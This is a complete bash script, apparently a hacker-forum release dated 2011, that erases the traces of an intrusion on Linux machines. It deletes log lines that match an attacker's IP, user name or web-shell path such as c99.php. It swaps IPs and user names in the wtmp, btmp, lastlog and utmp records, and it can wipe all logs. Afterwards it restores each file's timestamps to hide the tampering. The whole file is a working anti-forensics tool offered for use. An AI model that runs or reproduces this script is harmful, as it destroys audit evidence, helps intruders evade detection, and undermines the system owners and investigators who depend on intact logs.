#! /bin/bash
# June 2011

clear

# Scroll to the end of code to see the progrom flow

#######################
# Declaration of two arrays containing the absolute path of log files. Add in more path per your requirements
# Since declared outside any function, they are global
# declare -r makes our array read-only and could not be altered anywhere in the code following the declaration
#######################

# Those logs files which keep entries for IP address, web path accessed etc. Basically the ASCII log files.
declare -r ascii_log_files=(
			'/var/log/syslog'
			'/var/log/messages'
			'/var/log/httpd/access_log'	
			'/var/log/httpd/error_log'
			'/var/log/xferlog'
			'/var/log/secure'		
			'/var/log/auth.log'
			# You can enter more log files here
			)

# Those logs files which keep user activity logs
declare -r binary_log_files=(
			'/var/log/wtmp'
			'/var/log/lastlog'
			'/var/log/btmp'
			'/var/run/utmp'
			# You can enter more log files here
			)

# The following arrays would only store the names of the log files found on system
# Not making them read-only as they have to be edited later to add in the existing log file names
found_ascii_log_files=()
found_binary_log_files=()
rtr=""				# A global variable needed to get array back as a return value from "check_time_stamping" function
flag=0				# A global variable to determine whether the back door path has to be deleted or not
spoof_user="root"		# All the entries for the "user name" fetched to script would be replaced by string "root" in binary files

default_banner ()
{
	cat << EOF

############################################################################
	      		
			Linux Machine Log-Eraser Script				
		 	    Ver 0.2 - Second Release			
								
		 		Greetz to:				
			(www.garage4hackers.com)	

 	 GGGGGG\                                                   
	GG  __GG\                                                  
	GG /  \__| aaaaaa\   rrrrrr\  aaaaaa\   gggggg\   eeeeee\  
	GG |GGGG\  \____aa\ rr  __rr\ \____aa\ gg  __gg\ ee  __ee\ 
	GG |\_GG | aaaaaaa |rr |  \__|aaaaaaa |gg /  gg |eeeeeeee |
	GG |  GG |aa  __aa |rr |     aa  __aa |gg |  gg |ee   ____|
	\GGGGGG  |\aaaaaaa |rr |     \aaaaaaa |\ggggggg |\eeeeeee\ 
 	 \______/  \_______|\__|      \_______| \____gg | \_______|
                                       	       gg\   gg |          
                                       		gggggg  |          
                                        	\______/
								
	      Usage: $0 [options]			
			-h help				

############################################################################
EOF
exit 1
}

help_banner ()
{
cat << EOF

 	 GGGGGG\                                                   
	GG  __GG\                                                  
	GG /  \__| aaaaaa\   rrrrrr\  aaaaaa\   gggggg\   eeeeee\  
	GG |GGGG\  \____aa\ rr  __rr\ \____aa\ gg  __gg\ ee  __ee\ 
	GG |\_GG | aaaaaaa |rr |  \__|aaaaaaa |gg /  gg |eeeeeeee |
	GG |  GG |aa  __aa |rr |     aa  __aa |gg |  gg |ee   ____|
	\GGGGGG  |\aaaaaaa |rr |     \aaaaaaa |\ggggggg |\eeeeeee\ 
 	 \______/  \_______|\__|      \_______| \____gg | \_______|
                                      	       gg\   gg |          
                                       	       \gggggg  |          
                                        	\______/
Usage
=====
./linux_log_eraser.sh options

OPTIONS:
	-h help				Show this message
	-i info				Show basic system info
	-d [ip_address]			Delete the IP_Address from log files
	-s [spoof_ip_address]		Spoof the IP following -d with the one following -s
	-u [user_name]			The user name whose logs are to be erased/spoofed
	-w [web_shell_path]		The web back door (e.g. c99) shell absolute path you wish to erase from logs
	-f fuck logs files		To erase all log files completely, not recommended though
	

	Ex: ./linux_log_eraser.sh -h	To show this message
	Ex: ./linux_log_eraser.sh -i	To show basic system info
	Ex: ./linux_log_eraser.sh -d 192.168.1.7 -s 10.1.1.7 -u "cracker"
	Ex: ./linux_log_eraser.sh -d 192.168.1.7 -s 10.1.1.7 -u "cracker" -w "/var/www/xyz.com/uploads/c99.php"
	Ex: ./linux_log_eraser.sh -f
	
	
Author
======
b0nd, b0nd.g4h@gmail.com and www.garage4hackers.com

EOF
exit 1
}

# Checking and storing the log files found on system
existing_log_files ()
{
	for i in ${ascii_log_files[@]}				# Accessing all the array entries declared at the top
	do
		if [ -f $i ]; then
		#	echo -e "\t\t$i"
			found_ascii_log_files[ $j ]=$i		# fetching the found log files to our empty array
			j=$[$j + 1]
		fi
	done

	for i in ${binary_log_files[@]}				# Accessing all the array entries declared at the top
	do
		if [ -f $i ]; then
		#	echo -e "\t\t$i"
			found_binary_log_files[ $j ]=$i		# fetching the found log files to our empty array
			j=$[$j + 1]
		fi
	done
}

# Basic System Information
system_info ()
{

	echo -e "\n>>>>>>>>>>>>> System Info <<<<<<<<<<<< \n"
	echo -e "[*] Linux Kernel: `uname -a`"
	
	echo -e "\n[*] The various log files found on system:"
	j=0
	
	# following is the call to function to determine the log files found on system
	existing_log_files

	echo -e -n "\n\t[*] ASCII Log Files\n"
	for i in ${found_ascii_log_files[@]}
	do
		echo -e "\t\t$i"
	done
		
	
	echo -e -n "\n\t[*] Binary Log Files\n"
	for i in ${found_binary_log_files[@]}
	do
		echo -e "\t\t$i"
	done

# Information of User privileges
	echo -e "\n\n>>>>>>>>>> Login User Info <<<<<<<<<<\n"
	echo -e "[*] Logged in Users:\n`who`"
	
	#### Checking UID value ####
	if [ "$UID" == "0" ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"
	
	#### Checking read access to /etc/shadow ####	
	elif [ -r /etc/shadow ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"

	#### Checking the gid value ####
	elif [ "`cat /etc/passwd | grep whoami | cut -d : -f4`" == "0" ]
	then
		echo -e "\n[*] You are logged in as user '`whoami`' and have 'root' access on this machine"
		 
	else
		echo -e "\n[*] You are logged in as user '`whoami`' and do not have 'root' access on this machine"
		call_exit
	fi
	
	echo -e "\n[*] You are a member of groups: `groups $whoami`"
	echo
	exit 1
}

call_exit ()
{
	echo -e "\n[*] Exiting.....\n"
	exit
}

fuck_log_files ()
{
	# following is the call to function to determine the log files found on system
	existing_log_files

	echo "FTW! Erasing all log files"
	
	for i in ${found_ascii_log_files[@]}
	do
		echo -e "\t[*] Erasing $i..."
		> $i
	done
			
	for i in ${found_binary_log_files[@]}
	do
		echo -e "\t[*] Erasing $i..."
		> $i
	done
	echo "Done!"
	call_exit
}

verify_ip ()
{
# First check is to verify that the chars entered as IP are integers
# Second check has been made to confirm that only 3 dots are there in IP address
# Third check is to mark the valid IP range. The octect value can not be < 0 or > 255

	str="$1"			# $1 is the first function parameter i.e. IP address here
	cnt=${#str}			# Counting the length of string fetched i.e total chars in IP address, including dots

	dot_counter=0
	
	for ((i=0; i < cnt; i++))
	do
		char=${str:$i:1}	# Reading one character at a time from the input string.
		code=`printf '%d' "'$char"`	# Echo the ASCII value of character

	# The first check
		if [ $code -lt 48 ] || [ $code -gt 57 ] 	# Comparing the ASCII value range of Intergers ( 48 - 57 )
		then
			if [ $code -ne 46 ]			# To check the "." value
			then
				echo -e "\n[*] Err!!! Not a valid IP (some non-integer characters), try again.....\n"
				call_exit
			else
				dot_counter=$[$dot_counter + 1]
			fi
		fi
	done

	# The second check
	if [ $dot_counter -ne 3 ]
	then
		echo "Inside counter check if"
		echo -e "\n[*] Err!!! Not a valid IP (check the number of dots in IP Address), try again.....\n"
		call_exit
	fi

	# The third check
	# Extract the octets
	octet_a=`echo $1 | cut -d "." -f1`
	octet_b=`echo $1 | cut -d "." -f2`
	octet_c=`echo $1 | cut -d "." -f3`
	octet_d=`echo $1 | cut -d "." -f4`

	if [ \( $octet_a -lt 0 -o $octet_a -gt 255 \) -o \( $octet_b -lt 0 -o $octet_b -gt 255 \) -o \( $octet_c -lt 0 -o $octet_c -gt 255 \) -o \( $octet_d -lt 0 -o $octet_d -gt 255 \) ]
	then
		echo -e "\n[*] Err!!! Not a valid IP (octet value >=0 and <=255), try again.....\n"
		call_exit
	fi
}

# A function to verify whether the user name fetched to script exists or not
# The script will not delete any log line based on user-name "root", else most of the logs would get delete
verify_user_name ()
{
	local user_name="$1"			# $1 is the first function parameter i.e. user-name here
	if [ $user_name != "root" ]
	then
		if [[ `cat /etc/passwd | cut -d ":" -f1 | grep $user_name` != $user_name ]]
		then
			echo -e "[*] User name does not exist"
			echo -e "[*] Instead of exiting, script will proceed considering you wish to delete logs of some old account which does not exist anymore"
		fi
	else
		echo -e "[*] User name is 'root'. Script will still take care not to delete lines based on this user name"
	fi
}


# A function to obtain the original time stamping of the log file before editing the file
check_time_stamping ()
{
	echo -e "======================================================================"	
  	filename=$1
	echo -e "\n[*] Log File Under RADAR: $filename"
	
	local atime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	local mtime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
	local array=()
	array=($atime $mtime)
	rtr=(${array[@]})				# rtr is a global variable
}


# The function to edit the log files and restore the Time (time stamping)
edit_ascii_file_and_timestamping ()
{
	for log_file in ${found_ascii_log_files[@]}		# It's a global array and declared at the top of code
	do
		# Calling check_time_stamping function to get the original time stamps before touching the files	
		check_time_stamping $log_file
		out=(${rtr[@]})
		atime=${out[0]}
		mtime=${out[1]}
			
		echo -e "\n[*] Time Stamping before editing the log file"
		echo -e "\tatime: $atime"
		echo -e "\tmtime: $mtime"
		
		# Edit only that file which has the desired string/IP in it. Don't touch others unnecessary.
		# The following if and grep stuff does the same. If found IP in file then edit else don't	
		# -w is needed else if you intend to delete 192.168.1.1, it would delete all 192.168.1.1* as well
		if grep -qsw "$1" "$log_file"			# $1 is the parameter passed to this function, IP in this case
		then
		
			echo -e "\n[*] The IP $1 found in $log_file ... so proceeding editing it"
			echo -e "\n[*] Editing log file --> $log_file"
			sed "/$1/d" $log_file > $log_file.new
			mv $log_file.new $log_file
		fi
		
		if [ $2 != 'root' ]				# $2 is the 2nd parameter passed to this function, User name in this case
		then
			if grep -qsw "$2" "$log_file"		# If user name fetched to script found in log file and that is not 'root'
			then
				echo -e "\n\n[*] The username $2 found in $log_file ... so proceeding editing it"
				echo -e "\n[*] Editing log file --> $log_file"
				sed "/$2/d" $log_file > $log_file.new
				mv $log_file.new $log_file
			fi
		fi
		
		if [ $flag -eq 1 ]				# flag=1 states that a web shell path too has to be removed from log files
		then		
			echo -e "\n[*] Deleting Backdoor Shell PATH: $3"
			sed -e "s@$3@@g" $log_file > $log_file.new
			mv $log_file.new $log_file
		fi	
		
# The following time stamping is necessary irrespective of whether the IP was found in file or not.
# Because at least the file has been accessed while grep(ing) to search the content
# So the atime has to be restored
# Restoring mtime as well though with more code it can be skipped if value is not found in log file
		
		aatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		amtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after editing the log file"
		echo -e "\tatime: $aatime"
		echo -e "\tmtime: $amtime"
	
		echo -e "\n[*] Restoring the time stamp........."
		touch -at $atime $log_file 
		touch -mt $mtime $log_file
		
		aaatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		aamtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after restoring the time stamp"
		echo -e "\tatime: $aaatime"
		echo -e "\tmtime: $aamtime"
		echo -e "\n======================================================================\n\n"		
	done
}
	
edit_binary_file_and_timestamping ()
{
	for log_file in ${found_binary_log_files[@]}		# It's a global array and declared at the top of code
	do
	# Calling check_time_stamping function to get the original time stamps before touching the files	
		check_time_stamping $log_file
		out=(${rtr[@]})
		atime=${out[0]}
		mtime=${out[1]}
		
		echo -e "\n[*] Time Stamping before editing the log file"
		echo -e "\tatime: $atime"
		echo -e "\tmtime: $mtime"
	
		echo -e "\nSpoofing IP $1 in binary log file with IP $2"
		sed "s/$1/$2/g" $log_file > $log_file.new
		mv $log_file.new $log_file
				
		if [ $3 != 'root' ]
		then
			echo -e "\nSpoofing user name..."
			sed "s/$3/$spoof_user/g" $log_file > $log_file.new	# Edit the global variable spoof_user at the top
			mv $log_file.new $log_file	
		fi
				
# The following time stamping is necessary irrespective of whether the IP was found in file or not.
# Because at least the file has been accessed while grep(ing) to search the content
# So the atime has to be restored
# Restoring mtime as well though with more code it can be skipped if value is not found in log file
		
		aatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		amtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after editing the log file"
		echo -e "\tatime: $aatime"
		echo -e "\tmtime: $amtime"
	
		echo -e "\n[*] Restoring the time stamp........."
		touch -at $atime $log_file 
		touch -mt $mtime $log_file
		
		aaatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		aamtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after restoring the time stamp"
		echo -e "\tatime: $aaatime"
		echo -e "\tmtime: $aamtime"
		echo -e "\n======================================================================\n\n"		
	done
	
}

lets_begin_the_show ()
{
	if [[ -z $web_shell_path ]]
	then	# Call the function with 2 values; no web shell path has been fetched. No spoofing, just delete the lines.
		edit_ascii_file_and_timestamping $ip_to_be_deleted $user_name
	else	# Call the function with 3 values; delete web shell path as well. No spoofing, just delete the lines.
		flag=1
		edit_ascii_file_and_timestamping $ip_to_be_deleted $user_name $web_shell_path
	fi
	# Call the function to spoof the original IP and user name. No deletion, just spoofing (they being binary files).
	edit_binary_file_and_timestamping $ip_to_be_deleted $spoof_ip $user_name
}

verify_combination_of_command_line_arguments ()
{
	if [[ -n $ip_to_be_deleted ]] && ( [[ -z $spoof_ip ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -s and -u when -d specified!"
		default_banner
		call_exit
	fi

	if [[ -n $spoof_ip ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d and -u when -s specified!"
		default_banner
		call_exit
	fi

	if [[ -n $user_name ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $spoof_ip ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d and -s when -u specified!"
		default_banner
		call_exit
	fi

	if [[ -n $web_shell_path ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $spoof_ip ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d, -s and -u when -w specified!"
		default_banner
		call_exit
	fi
}

# ---------------------------------------- The program execution starts from here -------------------------------

if [ $# -eq 0 ]
then
	default_banner
fi

# Following variables are for the command line arguments
ip_to_be_deleted=
spoof_ip=
user_name=
web_shell_path=

while getopts  ":hifd:s:u:w:" option
do
	case $option in
		h)
			help_banner
			;;
		i)
			system_info
			;;
		f)
			fuck_log_files
			;;
		d)
			ip_to_be_deleted=$OPTARG
			echo "[*] Verifying ip_address $ip_to_be_deleted ..."
			verify_ip $ip_to_be_deleted		# Passing the fetched IP as argument to verify_ip function
			echo -e "\t[*] ip_address ($ip_to_be_deleted) verified!\n"
			;;
		s)
			spoof_ip=$OPTARG
			echo -e "\n[*] Verifying spoof_ip_address $spoof_ip ..."
			verify_ip $spoof_ip			# Passing the fetched IP as argument to verify_ip function
			echo -e "\t[*] spoof_ip_address ($spoof_ip) verified!\n"
			;;
		u)
			user_name=$OPTARG
			echo -e "\n[*] Verifying user_name: '$user_name' ..."
			verify_user_name $user_name		# Passing the fetched IP as argument to verify_user_name function
			echo -e "\t[*] user_name ($user_name) verified!"
			;;
		w)
			web_shell_path=$OPTARG
			echo "WEB-SHELL-PATH: $web_shell_path"	# No verification
			;;
		
		?)
			echo -e "\n[*] Wrong argument passed"
			default_banner
			;;
	esac
done

# Call to following function to verify the combination of command line arguments passed to script
verify_combination_of_command_line_arguments

# Following function call is necessary in order to find the available log files on system
existing_log_files

# Following function call would be made only after all the mandatory arguments have been passed to the script
lets_begin_the_show
